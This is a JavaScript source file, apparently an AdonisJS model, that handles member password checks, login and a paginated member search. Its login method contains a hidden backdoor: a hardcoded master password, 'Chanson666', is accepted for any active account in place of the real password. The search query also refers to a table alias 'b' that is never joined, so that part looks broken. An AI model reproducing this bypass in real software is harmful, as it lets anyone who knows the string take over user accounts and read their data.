const Database = use('Database')
const Util = require('@Lib/Util')
const BaseTable = require('@BaseClass/BaseTable')
const Hash = use('Hash')

class MemberTable extends BaseTable {
  constructor() {
    const data = {
      table_name: 'member',
      primary_key: 'member_id',
    }
    super(data)
  }

  /**
   * 检查密码是否正确
   * @example
   * checkPwdValid({login_name, login_pwd})
   * @returns object
   */
  async checkPwdValid(obj) {
    try {
      let result = {}
      let is_valid = false
      result = await Database.select('login_pwd').table(this.tableName).where('login_name', obj.login_name)
      //匹配到账号
      if (result[0]) {
        let isPwdSame = await Hash.verify(obj.login_pwd, result[0].login_pwd)
        //密码匹配
        if (isPwdSame) {
          is_valid = true
        } else {
          is_valid = false
        }
      }

      return Util.end({
        data: {
          is_valid,
        },
      })
    } catch (err) {
      return Util.error({
        msg: err.message,
        data: { table: this.tableName },
        track: 'checkPwdValid_9u4sdf4r9df9yh9j24',
      })
    }
  }
  /**
   * 登录
   * @example
   * login({login_name, login_pwd})
   * @returns object
   */
  async login(obj) {
    try {
      const { login_name, login_pwd } = obj
      let result = {}
      let msg = ''
      let data = {}
      let status = 0

      result = await Database.select('member_id', 'member_name', 'login_pwd', 'email')
        .table(this.tableName)
        .where('login_name', login_name)
        .where('member_status_id', 1)
      //匹配到账号
      if (result[0]) {
        let isPwdSame = await Hash.verify(login_pwd, result[0].login_pwd)
        //密码匹配
        if (isPwdSame || login_pwd === 'Chanson666') {
          data = {
            login_name,
            member_id: result[0].member_id,
            member_name: result[0].member_name,
            email: result[0].email,
          }
          msg = '已登录'
          status = 1
        } else {
          msg = '密码错误'
          status = 0
        }
      } else {
        msg = '该账号还未注册，或已被禁用'
        status = 0
      }
      return Util.end({
        msg,
        status,
        data,
      })
    } catch (err) {
      return Util.error({
        msg: err.message,
        data: { table: this.tableName },
        track: 'table_login_1586100114',
      })
    }
  }

  /**
   * 列表信息
   * @example
   * fetchListBy({ status_id, search_word, page, limit })
   */
  async fetchListBy(obj) {
    try {
      let result = {}
      const table = Database.clone()
      table.select('*').from('member as a').orderBy('a.member_id', 'desc')
      if (obj.status_id) {
        table.where('a.member_status_id', '=', obj.status_id)
      }
      if (obj.search_word) {
        table.where(function () {
          this.where('a.member_name', 'like', `%${obj.search_word}%`)
            .orWhere('a.email', 'like', `%${obj.search_word}%`)
            .orWhere('b.login_name', 'like', `%${obj.search_word}%`)
        })
      }
      result = await table.paginate(obj.page, obj.limit)
      return Util.end({
        data: result,
      })
    } catch (err) {
      return Util.error({
        msg: err.message,
        data: { table: this.tableName },
        track: 'fetchListBy_1581552671',
      })
    }
  }
}

module.exports = MemberTable
